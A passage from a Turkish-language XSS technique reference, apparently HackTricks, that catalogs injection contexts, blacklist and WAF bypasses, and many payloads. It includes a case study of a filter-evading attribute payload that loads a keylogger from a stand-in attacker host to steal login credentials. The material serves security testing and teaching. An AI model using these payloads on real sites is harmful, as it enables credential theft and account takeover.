# XSS (Cross Site Scripting)

{{#include ../../banners/hacktricks-training.md}}

## Metodoloji

1. Kontrol edin: HTML'de sizin kontrolünüzde olan herhangi bir değer (_parameters_, _path_, _headers_?, _cookies_?) **yansıtılıyor mu** veya **JS** kodu tarafından **kullanılıyor mu**.
2. Yansıtıldığı/kullanıldığı **bağlamı bulun**.
3. Eğer **yansıtılıyorsa**
1. **Hangi sembolleri kullanabildiğinizi** kontrol edin ve buna göre payload hazırlayın:
1. **raw HTML** içinde:
1. Yeni HTML tagleri oluşturabiliyor musunuz?
2. `javascript:` protokolünü destekleyen event veya attribute'leri kullanabiliyor musunuz?
3. Korunmaları bypass edebiliyor musunuz?
4. HTML içeriği herhangi bir client side JS engine (_AngularJS_, _VueJS_, _Mavo_...) tarafından yorumlanıyor mu; bu durumda bir [**Client Side Template Injection**](../client-side-template-injection-csti.md) suistimal edilebilir.
5. Eğer JS kodu çalıştıran HTML tagleri oluşturamıyorsanız, bir [**Dangling Markup - HTML scriptless injection**](../dangling-markup-html-scriptless-injection/index.html) suistimal edebilir misiniz?
2. Bir **HTML tagı** içinde:
1. Raw HTML bağlamına çıkıp çıkamayacağınızı kontrol edin?
2. JS kodu çalıştıracak yeni event/attribute'ler oluşturabilir misiniz?
3. İçinde sıkıştığınız attribute JS çalıştırmayı destekliyor mu?
4. Korunmaları bypass edebiliyor musunuz?
3. **JavaScript code** içinde:
1. `<script>` tagından kaçabilir misiniz?
2. String'ten kaçıp farklı JS kodu çalıştırabilir misiniz?
3. Girdiniz template literals `` içinde mi?
4. Korunmaları bypass edebiliyor musunuz?
4. Çalıştırılan Javascript **function**
1. Çalıştırılacak function'ın adını belirtebilirsiniz. örn: `?callback=alert(1)`
4. Eğer **kullanılıyorsa**:
1. Bir **DOM XSS**'i suistimal edebilirsiniz; girdinizin nasıl kontrol edildiğine ve kontrolünüzdeki girdinin herhangi bir sink tarafından kullanılıp kullanılmadığına dikkat edin.

Karmaşık bir XSS üzerinde çalışırken aşağıdakiler ilginizi çekebilir:


{{#ref}}
debugging-client-side-js.md
{{#endref}}

## Reflected values

Bir XSS'i başarılı bir şekilde suistimal edebilmek için ilk bulmanız gereken şey, web sayfasında **sizin tarafınızdan kontrol edilen ve yansıtılan bir değerdir**.

- **Intermediately reflected**: Eğer bir parametrenin veya path'in değeri web sayfasında yansıtılıyorsa bir **Reflected XSS** suistimal edilebilir.
- **Stored and reflected**: Eğer sizin kontrolünüzdeki bir değer sunucuda kaydedilip her sayfa erişiminde yansıtılıyorsa bir **Stored XSS** suistimal edilebilir.
- **Accessed via JS**: Eğer sizin kontrolünüzdeki bir değer JS kullanılarak erişiliyorsa bir **DOM XSS** suistimal edilebilir.

## Contexts

Bir XSS'i suistimal etmeye çalışırken ilk bilmeniz gereken, girdinizin **nerede yansıtıldığıdır**. Bağlama bağlı olarak, rastgele JS kodunu farklı şekillerde çalıştırabilirsiniz.

### Raw HTML

Eğer girdiniz **raw HTML** içinde yansıtılıyorsa JS kodu çalıştırmak için bazı **HTML tagleri** suistimal etmeniz gerekir: `<img , <iframe , <svg , <script` ... bunlar kullanabileceğiniz birçok HTML taginden sadece birkaçıdır.\
Ayrıca, [Client Side Template Injection](../client-side-template-injection-csti.md) unutmayın.

### HTML tag attribute içinde

Eğer girdiniz bir tagın attribute değerinin içinde yansıtılıyorsa şunları deneyebilirsiniz:

1. **Attribute'tan ve tagdan çıkmak** (sonrasında raw HTML bağlamında olursunuz) ve suistimal etmek için yeni HTML tagi oluşturmak: `"><img [...]`
2. Eğer **attribute'tan çıkabiliyor ama tagdan çıkamıyorsanız** (`>` encode edilmiş veya silinmişse), tag'a bağlı olarak JS kodu çalıştıran bir **event** oluşturabilirsiniz: `" autofocus onfocus=alert(1) x="`
3. Eğer **attribute'tan çıkamıyorsanız** (`"` encode ediliyor veya siliniyorsa), sonra hangi **attribute** içinde yansıtıldığına ve değerin tamamını mı yoksa sadece bir kısmını mı kontrol ettiğinize göre bunu suistimal edebilirsiniz. Örneğin, eğer `onclick=` gibi bir event'i kontrol ediyorsanız, tıklanınca rastgele kod çalıştırabilirsiniz. Bir başka ilginç örnek `href` attribute'udur; burada `javascript:` protokolünü kullanarak rastgele kod çalıştırabilirsiniz: **`href="javascript:alert(1)"`**
4. Girdiniz "**suistimal edilemeyen taglar**" içinde yansıtılıyorsa `accesskey` hilesini deneyebilirsiniz (bunu suistimal etmek için bir çeşit sosyal mühendislik gerekebilir): **`" accesskey="x" onclick="alert(1)" x="`**

#### WAF arkasındaki sadece attribute XSS'leri

Kurumsal bir SSO login sayfası OAuth `service` parametresini `<a id="forgot_btn" ...>` içindeki `href` attribute'una yansıtıyordu. `<` ve `>` HTML-encode edilmiş olsa da çift tırnaklar edilmemişti, böylece saldırgan attribute'u kapatıp aynı elementi tekrar kullanarak `" onfocus="payload" x="` gibi handler'lar inject edebildi.

1. **Handler'ı inject edin:** `onclick="print(1)"` gibi basit payloadlar engellendi, ancak WAF inline attribute'lardaki ilk JavaScript ifadesini denetliyordu. Zararsız bir ifade parantez içinde öne koyup ardından noktalı virgül eklemek gerçek payload'ın çalışmasına izin verdi: `onfocus="(history.length);malicious_code_here"`.
2. **Otomatik tetikleyin:** Tarayıcılar fragment ile eşleşen herhangi bir elemente focus veriyor, bu yüzden exploit URL'ine `#forgot_btn` eklemek anchor'ın sayfa yüklenince focus olmasını ve handler'ın tıklama gerektirmeden çalışmasını sağlar.
3. **Inline stub'u küçük tutun:** Hedef zaten jQuery yüklüyordu. Handler sadece `$.getScript(...)` ile isteği başlatmak için yetiyordu, tam keylogger saldırganın sunucusunda barınıyordu.

**Tırnak olmadan stringler oluşturma**

Single quote'lar URL-encoded döndürülmüş ve kaçırılmış double quote attribute'u bozuyordu, bu yüzden payload her stringi `String.fromCharCode` ile üretiyordu. Herhangi bir URL'yi char code'lara çevirmeyi kolaylaştıran bir yardımcı fonksiyon, attribute içine yapıştırmadan önce bunu yapmayı kolaylaştırır:
```javascript
function toCharCodes(str){
return `const url = String.fromCharCode(${[...str].map(c => c.charCodeAt(0)).join(',')});`
}
console.log(toCharCodes('https://attacker.tld/keylogger.js'))
```
Ortaya çıkan bir öznitelik şöyle görünüyordu:
```html
onfocus="(history.length);const url=String.fromCharCode(104,116,116,112,115,58,47,47,97,116,116,97,99,107,101,114,46,116,108,100,47,107,101,121,108,111,103,103,101,114,46,106,115);$.getScript(url),function(){}"
```
**Neden bu kimlik bilgilerini çalar**

Dış script (saldırgan kontrolündeki bir host'tan veya Burp Collaborator'dan yüklenen) `document.onkeypress`'e hook'ladı, tuş vuruşlarını buffer'a aldı ve her saniye `new Image().src = collaborator_url + keys`'i çalıştırdı. XSS yalnızca kimlik doğrulanmamış kullanıcılar için tetiklendiği için hassas işlem giriş formunun kendisidir — saldırgan, kurban "Login"e hiç basmasa bile kullanıcı adlarını ve parolaları keylogs eder.

Weird example of Angular executing XSS if you controls a class name:
```html
<div ng-app>
<strong class="ng-init:constructor.constructor('alert(1)')()">aaa</strong>
</div>
```
### JavaScript kodu içinde

Bu durumda girdiniz bir HTML sayfasının **`<script> [...] </script>`** etiketleri arasında, bir `.js` dosyasının içinde veya **`javascript:`** protokolünü kullanan bir attribute içinde yansıtılır:

- Eğer yansıma **`<script> [...] </script>`** etiketleri arasında ise, girdiniz herhangi bir türde tırnak içinde olsa bile `</script>` enjekte etmeyi ve bu bağlamdan çıkmayı deneyebilirsiniz. Bunun nedeni, **tarayıcının önce HTML etiketlerini ayrıştırması** ve sonra içeriği ayrıştırmasıdır; dolayısıyla enjekte ettiğiniz `</script>` etiketinin HTML kodunun içinde olduğunu fark etmeyecektir.
- Eğer yansıma **bir JS string'i içinde** ise ve önceki hile işe yaramıyorsa, string'ten **çıkmanız**, kodunuzu **çalıştırmanız** ve JS kodunu **yeniden kurmanız** gerekir (herhangi bir hata olursa çalıştırılmaz:
- `'-alert(1)-'`
- `';-alert(1)//`
- `\';alert(1)//`
- Template literals içinde yansıtılıyorsa `${ ... }` sözdizimini kullanarak **JS ifadeleri ekleyebilirsiniz**: `` var greetings = `Hello, ${alert(1)}` ``
- **Unicode encode** kullanarak **valid javascript code** yazmak mümkündür:
```javascript
alert(1)
alert(1)
alert(1)
```
#### Javascript Hoisting

Javascript Hoisting, bir XSS'in bildirilmemiş değişkenler veya fonksiyonlar kullandığı senaryolardan yararlanabilmeniz için, fonksiyonları, değişkenleri veya sınıfları kullanıldıktan sonra **declare** etme fırsatına işaret eder.**\
**Daha fazla bilgi için şu sayfayı kontrol edin:**


{{#ref}}
js-hoisting.md
{{#endref}}

### Javascript Function

Bazı web sayfalarının **çalıştırılacak fonksiyonun adını parametre olarak kabul eden** endpoint'leri vardır. Sahada sık görülen bir örnek şu şekildedir: `?callback=callbackFunc`.

Kullanıcı tarafından doğrudan verilen bir şeyin çalıştırılmaya çalışılıp çalıştırılmadığını anlamanın iyi bir yolu, **parametre değerini değiştirmek** (örneğin 'Vulnerable' yapıp) ve console'da şu gibi hatalara bakmaktır:

![](<../../images/image (711).png>)

Eğer zayıfsa, sadece şu değeri göndererek **bir alert tetikleyebilirsiniz**: **`?callback=alert(1)`**. Ancak, bu endpoint'lerin genellikle içeriği doğrulayarak sadece harf, rakam, nokta ve alt çizgiye izin verdiği (**`[\w\._]`**) çok yaygındır.

Ancak, bu sınırlamaya rağmen bazı işlemleri gerçekleştirmek hâlâ mümkündür. Bunun nedeni, bu geçerli karakterleri kullanarak **DOM'daki herhangi bir elemana erişebilmenizdir**:

![](<../../images/image (747).png>)

Bunlar için bazı kullanışlı fonksiyonlar:
```
firstElementChild
lastElementChild
nextElementSibiling
lastElementSibiling
parentElement
```
Ayrıca **Javascript functions**'ı doğrudan tetiklemeyi deneyebilirsiniz: `obj.sales.delOrders`.

Ancak genelde belirtilen fonksiyonu çalıştıran endpoint'ler çok ilginç bir DOM'a sahip olmaz; **other pages in the same origin** daha fazla işlem yapmak için **daha ilginç bir DOM** içerir.

Bu nedenle, **abuse this vulnerability in a different DOM** amacıyla **Same Origin Method Execution (SOME)** istismarı geliştirildi:


{{#ref}}
some-same-origin-method-execution.md
{{#endref}}

### DOM

Bazı **JS code**'ları `location.href` gibi **attacker tarafından kontrol edilen** verileri **güvensiz şekilde** kullanıyor. Bir attacker, bunu keyfi JS kodu çalıştırmak için abuse edebilir.


{{#ref}}
dom-xss.md
{{#endref}}

### **Universal XSS**

Bu tür XSS'ler **her yerde** bulunabilir. Bunlar sadece bir web uygulamasının client tarafı istismarına bağlı değildir; **herhangi bir** **context** içinde ortaya çıkabilir. Bu tür **arbitrary JavaScript execution**'lar RCE elde etmek, client ve serverlarda **arbitrary** **files** okumak ve daha fazlası için abuse edilebilir.\
Bazı **örnekler**:


{{#ref}}
server-side-xss-dynamic-pdf.md
{{#endref}}


{{#ref}}
../../network-services-pentesting/pentesting-web/electron-desktop-apps/
{{#endref}}

## WAF bypass encoding image

![from https://twitter.com/hackerscrolls/status/1273254212546281473?s=21](<../../images/EauBb2EX0AERaNK (1).jpg>)

## Injecting inside raw HTML

Girdiğiniz **inside the HTML page** içinde yansıtılıyorsa veya bu bağlamda escape yapıp HTML kodu inject edebiliyorsanız, yapılması gereken **ilk** şey yeni tag'lar oluşturmak için `<` karakterini abuse edip edemeyeceğinizi kontrol etmektir: O **char**'ın yansıtılıp yansıtılmadığını deneyin ve **HTML encoded** olup olmadığını, silinip silinmediğini ya da **değişiklik olmadan yansıtılıp yansıtılmadığını** kontrol edin. **Sadece son durumda bu durumu exploit edebileceksiniz**.\
Bu durumlar için ayrıca **aklınızda bulundurun** [**Client Side Template Injection**](../client-side-template-injection-csti.md)**.**\
_**Not: Bir HTML yorumu şu ifadelerle kapatılabilir\*\***\***\*`-->`\*\***\***\*veya \*\***`--!>`\*\*_ 

Bu durumda ve eğer black/whitelisting kullanılmıyorsa, şu payload'ları kullanabilirsiniz:
```html
<script>
alert(1)
</script>
<img src="x" onerror="alert(1)" />
<svg onload=alert('XSS')>
```
Ancak, tags/attributes black/whitelisting kullanılıyorsa, hangi tags'leri oluşturabileceğinizi **brute-force** etmeniz gerekir.\
İzin verilen tags'leri tespit ettikten sonra, bulduğunuz geçerli tags içinde attributes/events'i **brute-force** ederek bağlamı nasıl istismar edebileceğinizi görmeniz gerekir.

### Tags/Events brute-force

Go to [**https://portswigger.net/web-security/cross-site-scripting/cheat-sheet**](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) and click on _**Copy tags to clipboard**_. Ardından, bunların tamamını Burp intruder ile gönderin ve herhangi bir tag'in WAF tarafından zararlı olarak tespit edilip edilmediğini kontrol edin. Hangi tags'leri kullanabileceğinizi keşfettikten sonra, geçerli tags'leri kullanarak tüm events'i **brute force** edebilirsiniz (aynı web sayfasında _**Copy events to clipboard**_'a tıklayın ve öncekiyle aynı prosedürü uygulayın).

### Custom tags

Eğer geçerli herhangi bir HTML tag'i bulamadıysanız, **create a custom tag** oluşturmayı ve `onfocus` attribute'u ile JS kodu çalıştırmayı deneyebilirsiniz. XSS isteğinde, sayfanın o nesneye **focus on that object** ve kodu **execute** etmesini sağlamak için URL'yi `#` ile bitirmeniz gerekir:
```
/?search=<xss+id%3dx+onfocus%3dalert(document.cookie)+tabindex%3d1>#x
```
### Blacklist Bypasses

Eğer bir tür blacklist kullanılıyorsa, onu bazı basit hilelerle bypass etmeyi deneyebilirsiniz:
```javascript
//Random capitalization
<script> --> <ScrIpT>
<img --> <ImG

//Double tag, in case just the first match is removed
<script><script>
<scr<script>ipt>
<SCRscriptIPT>alert(1)</SCRscriptIPT>

//You can substitude the space to separate attributes for:
/
/*%00/
/%00*/
%2F
%0D
%0C
%0A
%09

//Unexpected parent tags
<svg><x><script>alert('1'&#41</x>

//Unexpected weird attributes
<script x>
<script a="1234">
<script ~~~>
<script/random>alert(1)</script>
<script      ///Note the newline
>alert(1)</script>
<scr\x00ipt>alert(1)</scr\x00ipt>

//Not closing tag, ending with " <" or " //"
<iframe SRC="javascript:alert('XSS');" <
<iframe SRC="javascript:alert('XSS');" //

//Extra open
<<script>alert("XSS");//<</script>

//Just weird an unexpected, use your imagination
<</script/script><script>
<input type=image src onerror="prompt(1)">

//Using `` instead of parenthesis
onerror=alert`1`

//Use more than one
<<TexTArEa/*%00//%00*/a="not"/*%00///AutOFocUs////onFoCUS=alert`1` //
```
### Length bypass (small XSSs)

> [!NOTE] > **Farklı ortamlar için daha fazla tiny XSS** payload [**can be found here**](https://github.com/terjanq/Tiny-XSS-Payloads) ve [**here**](https://tinyxss.terjanq.me).
```html
<!-- Taken from the blog of Jorge Lajara -->
<svg/onload=alert``> <script src=//aa.es> <script src=//℡㏛.pw>
```
The last one is using 2 unicode characters which expands to 5: telsr\
More of these characters can be found [burada](https://www.unicode.org/charts/normalization/).\
To check in which characters are decomposed check [burada](https://www.compart.com/en/unicode/U+2121).

### Click XSS - Clickjacking

Eğer zafiyeti kullanmak için **kullanıcının önceden doldurulmuş bir linke veya form'a tıklaması** gerekiyorsa, sayfa savunmasızsa [**abuse Clickjacking**](../clickjacking.md#xss-clickjacking) denemeyi düşünebilirsiniz.

### İmkansız - Dangling Markup

Eğer sadece **JS kodu çalıştırmak için attribute'a sahip bir HTML etiketi oluşturmanın imkansız olduğunu** düşünüyorsanız, [**Danglig Markup** ](../dangling-markup-html-scriptless-injection/index.html)because zafiyetten **JS** çalıştırmadan **faydalanabilirsiniz**.

## HTML etiketinin içine enjeksiyon

### Etiketin içinde / attribute değerinden kaçış

Eğer **bir HTML etiketinin içindeyseniz**, ilk deneyebileceğiniz şey etiketten **kaçmak** ve JS kodu çalıştırmak için [önceki bölümde](#injecting-inside-raw-html) bahsedilen tekniklerden bazılarını kullanmaktır.\
Eğer etiketten **kaçamazsanız**, JS kodu çalıştırmayı denemek için etiketin içinde yeni attribute'lar oluşturabilirsiniz; örneğin aşağıdaki gibi bir payload kullanabilirsiniz (_bu örnekte attribute'dan kaçmak için çift tırnak kullanıldığına dikkat edin, girdiniz doğrudan etiketin içinde yansıtılıyorsa bunlara ihtiyacınız olmayacaktır_):
```bash
" autofocus onfocus=alert(document.domain) x="
" onfocus=alert(1) id=x tabindex=0 style=display:block>#x #Access http://site.com/?#x t
```
**Stil olayları**
```python
<p style="animation: x;" onanimationstart="alert()">XSS</p>
<p style="animation: x;" onanimationend="alert()">XSS</p>

#ayload that injects an invisible overlay that will trigger a payload if anywhere on the page is clicked:
<div style="position:fixed;top:0;right:0;bottom:0;left:0;background: rgba(0, 0, 0, 0.5);z-index: 5000;" onclick="alert(1)"></div>
#moving your mouse anywhere over the page (0-click-ish):
<div style="position:fixed;top:0;right:0;bottom:0;left:0;background: rgba(0, 0, 0, 0.0);z-index: 5000;" onmouseover="alert(1)"></div>
```
### Öznitelik içinde

Öznitelikten **kaçamıyor olsanız bile** (`"` kodlanıyor ya da siliniyor), değerinizin **hangi öznitelikte** yansıtıldığına ve **tüm değeri mi yoksa sadece bir kısmını mı** kontrol ettiğinize bağlı olarak bundan faydalanabilirsiniz. For **example**, `onclick=` gibi bir event'i kontrol ediyorsanız, tıklandığında istediğiniz kodu çalıştırmasını sağlayabilirsiniz.\  
Another interesting **example** is the attribute `href`, where you can use the `javascript:` protocol to execute arbitrary code: **`href="javascript:alert(1)"`**

**HTML encoding/URL encode kullanarak event içinde bypass**

HTML etiket özniteliklerinin değerleri içindeki **HTML ile kodlanmış karakterler** çalışma zamanında **çözülür**. Bu yüzden aşağıdakine benzer bir şey geçerli olacaktır (payload kalın): `<a id="author" href="http://none" onclick="var tracker='http://foo?`**`&apos;-alert(1)-&apos;`**`';">Go Back </a>`

Her türlü **HTML kodlaması** geçerlidir:
```javascript
//HTML entities
&apos;-alert(1)-&apos;
//HTML hex without zeros
&#x27-alert(1)-&#x27
//HTML hex with zeros
&#x00027-alert(1)-&#x00027
//HTML dec without zeros
&#39-alert(1)-&#39
//HTML dec with zeros
&#00039-alert(1)-&#00039

<a href="javascript:var a='&apos;-alert(1)-&apos;'">a</a>
<a href="&#106;avascript:alert(2)">a</a>
<a href="jav&#x61script:alert(3)">a</a>
```
**Unutmayın: URL encode de işe yarar:**
```python
<a href="https://example.com/lol%22onmouseover=%22prompt(1);%20img.png">Click</a>
```
**Bypass event içinde Unicode encode kullanarak**
```javascript
//For some reason you can use unicode to encode "alert" but not "(1)"
<img src onerror=\u0061\u006C\u0065\u0072\u0074(1) />
<img src onerror=\u{61}\u{6C}\u{65}\u{72}\u{74}(1) />
```
### Öznitelik İçindeki Özel Protokoller

Burada bazı yerlerde **`javascript:`** veya **`data:`** protokollerini **keyfi JS kodu çalıştırmak** için kullanabilirsiniz. Bazıları kullanıcı etkileşimi gerektirebilir, bazıları gerektirmez.
```javascript
javascript:alert(1)
JavaSCript:alert(1)
javascript:%61%6c%65%72%74%28%31%29 //URL encode
javascript&colon;alert(1)
javascript&#x003A;alert(1)
javascript&#58;alert(1)
javascript:alert(1)
java        //Note the new line
script:alert(1)

data:text/html,<script>alert(1)</script>
DaTa:text/html,<script>alert(1)</script>
data:text/html;charset=iso-8859-7,%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%31%29%3c%2f%73%63%72%69%70%74%3e
data:text/html;charset=UTF-8,<script>alert(1)</script>
data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=
data:text/html;charset=thing;base64,PHNjcmlwdD5hbGVydCgndGVzdDMnKTwvc2NyaXB0Pg
data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==
```
**Bu protokolleri enjekte edebileceğiniz yerler**

**Genel olarak** `javascript:` protokolü **`href` özniteliğini kabul eden herhangi bir etikette kullanılabilir** ve `src` özniteliğini kabul eden etiketlerin **çoğunda** (ancak `<img>`'de değil)
```html
<a href="javascript:alert(1)">
<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=">
<form action="javascript:alert(1)"><button>send</button></form>
<form id=x></form><button form="x" formaction="javascript:alert(1)">send</button>
<object data=javascript:alert(3)>
<iframe src=javascript:alert(2)>
<embed src=javascript:alert(1)>

<object data="data:text/html,<script>alert(5)</script>">
<embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik7PC9zY3JpcHQ+" type="image/svg+xml" AllowScriptAccess="always"></embed>
<embed src="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg=="></embed>
<iframe src="data:text/html,<script>alert(5)</script>"></iframe>

//Special cases
<object data="//hacker.site/xss.swf"> .//https://github.com/evilcos/xss.swf
<embed code="//hacker.site/xss.swf" allowscriptaccess=always> //https://github.com/evilcos/xss.swf
<iframe srcdoc="<svg onload=alert(4);>">
```
**Diğer obfuscation tricks**

_**Bu durumda, önceki bölümdeki HTML encoding ve Unicode encoding hilesi de geçerlidir çünkü bir attribute içindesiniz.**_
```javascript
<a href="javascript:var a='&apos;-alert(1)-&apos;'">
```
Üstelik, bu durumlar için başka bir **güzel hile** var: **Girdiğiniz `javascript:...` içindeyken URL encoded olsa bile, yürütülmeden önce URL decoded olur.** Yani, **escape** ile **string**'den bir **single quote** kullanarak çıkmanız gerekiyorsa ve bunun **URL encoded** olduğunu görürseniz, unutmayın ki **önemi yok,** yürütme sırasında **single quote** olarak **yorumlanacaktır**.
```javascript
&apos;-alert(1)-&apos;
%27-alert(1)-%27
<iframe src=javascript:%61%6c%65%72%74%28%31%29></iframe>
```
Unutmayın ki eğer **her ikisini** `URLencode + HTMLencode`'i herhangi bir sırayla **payload**'ı kodlamak için kullanmaya çalışırsanız, bu **işe** **yaramayacak**, ancak **payload içinde karıştırabilirsiniz**.

**`javascript:` ile Hex ve Octal encode kullanımı**

`iframe`'in `src` attribute'ı içinde (en azından) **Hex** ve **Octal encode** kullanarak **HTML tags to execute JS** bildirebilirsiniz:
```javascript
//Encoded: <svg onload=alert(1)>
// This WORKS
<iframe src=javascript:'\x3c\x73\x76\x67\x20\x6f\x6e\x6c\x6f\x61\x64\x3d\x61\x6c\x65\x72\x74\x28\x31\x29\x3e' />
<iframe src=javascript:'\74\163\166\147\40\157\156\154\157\141\144\75\141\154\145\162\164\50\61\51\76' />

//Encoded: alert(1)
// This doesn't work
<svg onload=javascript:'\x61\x6c\x65\x72\x74\x28\x31\x29' />
<svg onload=javascript:'\141\154\145\162\164\50\61\51' />
```
### Reverse tab nabbing
```javascript
<a target="_blank" rel="opener"
```
Eğer herhangi bir URL'yi rastgele bir **`<a href=`** etiketi içine enjekte edebiliyorsanız ve bu etiket **`target="_blank" and rel="opener"`** attributesine sahipse, bu davranışı istismar etmek için aşağıdaki sayfayı kontrol edin:

{{#ref}}
../reverse-tab-nabbing.md
{{#endref}}

### on Event Handlers Bypass

Öncelikle kullanışlı **"on" event handlers** için bu sayfayı kontrol edin: [https://portswigger.net/web-security/cross-site-scripting/cheat-sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet).\
Eğer bazı blacklist'ler bu event handler'ları oluşturmanızı engelliyorsa aşağıdaki bypass'ları deneyebilirsiniz:
```javascript
<svg onload%09=alert(1)> //No safari
<svg %09onload=alert(1)>
<svg %09onload%20=alert(1)>
<svg onload%09%20%28%2c%3b=alert(1)>

//chars allowed between the onevent and the "="
IExplorer: %09 %0B %0C %020 %3B
Chrome: %09 %20 %28 %2C %3B
Safari: %2C %3B
Firefox: %09 %20 %28 %2C %3B
Opera: %09 %20 %2C %3B
Android: %09 %20 %28 %2C %3B
```
### XSS in "Unexploitable tags" (hidden input, link, canonical, meta)

Buradan [**here**](https://portswigger.net/research/exploiting-xss-in-hidden-inputs-and-meta-tags) **artık hidden inputs şu yöntemlerle kötüye kullanılabiliyor:**
```html
<button popvertarget="x">Click me</button>
<input type="hidden" value="y" popover id="x" onbeforetoggle="alert(1)" />
```
Ve **meta etiketlerinde**:
```html
<!-- Injection inside meta attribute-->
<meta
name="apple-mobile-web-app-title"
content=""
Twitter
popover
id="newsletter"
onbeforetoggle="alert(2)" />
<!-- Existing target-->
<button popovertarget="newsletter">Subscribe to newsletter</button>
<div popover id="newsletter">Newsletter popup</div>
```
Buradan [**here**](https://portswigger.net/research/xss-in-hidden-input-fields): Bir **XSS payload inside a hidden attribute** çalıştırabilirsiniz; bunun için **victim**'ı **key combination**'ı tuşlamaya ikna etmeniz gerekir. Firefox (Windows/Linux) için tuş kombinasyonu **ALT+SHIFT+X**, OS X için **CTRL+ALT+X**'tir. access key attribute içinde farklı bir tuşa yer vererek farklı bir **key combination** belirleyebilirsiniz. İşte vector:
```html
<input type="hidden" accesskey="X" onclick="alert(1)">
```
**XSS payload şu şekilde olacaktır: `" accesskey="x" onclick="alert(1)" x="`**

### Blacklist Bypasses

Bu bölümde farklı encoding kullanımıyla ilgili birkaç hile zaten gösterildi. Geri dönüp nerelerde kullanabileceğinizi öğrenin:

- **HTML encoding (HTML tags)**
- **Unicode encoding (can be valid JS code):** `\u0061lert(1)`
- **URL encoding**
- **Hex and Octal encoding**
- **data encoding**

**Bypasses for HTML tags and attributes**

Read the[ Blacklist Bypasses of the previous section](#blacklist-bypasses).

**Bypasses for JavaScript code**

Read the J[avaScript bypass blacklist of the following section](#javascript-bypass-blacklists-techniques).

### CSS-Gadgets

Eğer web'in çok küçük bir kısmında etkileşim gerektiren bir **XSS** bulduysanız (örneğin footer'da onmouseover öğesi olan küçük bir link), öğenin kapladığı alanı **değiştirerek** linkin tetiklenme ihtimalini artırmayı deneyebilirsiniz.

Örneğin, öğeye şu şekilde bazı stil ekleyebilirsiniz: `position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: red; opacity: 0.5`

Ancak, eğer WAF style attribute'ünü filtreliyorsa, CSS Styling Gadgets kullanabilirsiniz; örneğin şunları bulursanız

> .test {display:block; color: blue; width: 100%\}

ve

> \#someid {top: 0; font-family: Tahoma;}

Şimdi linkimizi değiştirip şu forma getirebilirsiniz

> \<a href="" id=someid class=test onclick=alert() a="">

Bu hile şu kaynaktan alınmıştır: [https://medium.com/@skavans\_/improving-the-impact-of-a-mouse-related-xss-with-styling-and-css-gadgets-b1e5dec2f703](https://medium.com/@skavans_/improving-the-impact-of-a-mouse-related-xss-with-styling-and-css-gadgets-b1e5dec2f703)

## Injecting inside JavaScript code

Bu durumda sizin **input**'ınız bir `.js` dosyasının JS kodu içinde veya `<script>...</script>` tagleri arasında ya da JS kodunu çalıştırabilecek HTML eventleri arasında ya da `javascript:` protokolünü kabul eden attributlar arasında yansıtılacaktır.

### Escaping \<script> tag

Eğer kodunuz `<script> [...] var input = 'reflected data' [...] </script>` içinde yansıtılıyorsa, kolayca **`</script>` etiketini kaçış yaparak kapatabilirsiniz**:
```javascript
</script><img src=1 onerror=alert(document.domain)>
```
Bu örnekte **tek tırnağı bile kapatmadığımızı** unutmayın. Bunun nedeni, **HTML ayrıştırmasının önce tarayıcı tarafından yapılmasıdır**, bu da script blokları dahil sayfa öğelerinin tespit edilmesini içerir. Gömülü scriptleri anlamak ve çalıştırmak için JavaScript'in ayrıştırılması ise ancak sonrasında gerçekleştirilir.

### JS kodu içinde

Eğer `<>` temizleniyorsa yine de girdinizin **bulunduğu** yerde dizeyi **escape the string** yaparak **execute arbitrary JS** gerçekleştirebilirsiniz. JS sözdizimini **fix JS syntax** etmek önemlidir; çünkü herhangi bir hata olursa JS kodu çalıştırılmaz:
```
'-alert(document.domain)-'
';alert(document.domain)//
\';alert(document.domain)//
```
#### JS-in-JS string break → inject → repair pattern

Kullanıcı girdisi tırnaklı bir JavaScript string'inin içine düştüğünde (ör. inline script'e server-side echo), string'i sonlandırıp kod enjekte edebilir ve ayrıştırmanın geçerli kalması için sözdizimini onarabilirsiniz. Genel iskelet:
```
"            // end original string
;            // safely terminate the statement
<INJECTION>  // attacker-controlled JS
; a = "      // repair and resume expected string/statement
```
Zafiyetli parametrenin bir JS string içine yansıtıldığı durum için örnek URL deseni:
```
?param=test";<INJECTION>;a="
```
Bu, attacker JS'i HTML bağlamına dokunmadan çalıştırır (pure JS-in-JS). Filtreler anahtar kelimeleri engellediğinde aşağıdaki blacklist bypasses ile birleştirin.

### Template literals ``

Tek ve çift tırnakların dışında, JS **strings** oluşturmak için **backticks** **` `` `** de kabul eder. Buna template literals denir; çünkü `${ ... }` sözdizimini kullanarak **embedded JS expressions** yerleştirmeye izin verir.\
Bu nedenle, eğer girdiniz backticks kullanan bir JS stringi içinde **reflected** olarak geri yansıtılıyorsa, `${ ... }` sözdizimini kötüye kullanarak **arbitrary JS code** çalıştırabilirsiniz:

Bu şu şekilde **abused** edilebilir:
```javascript
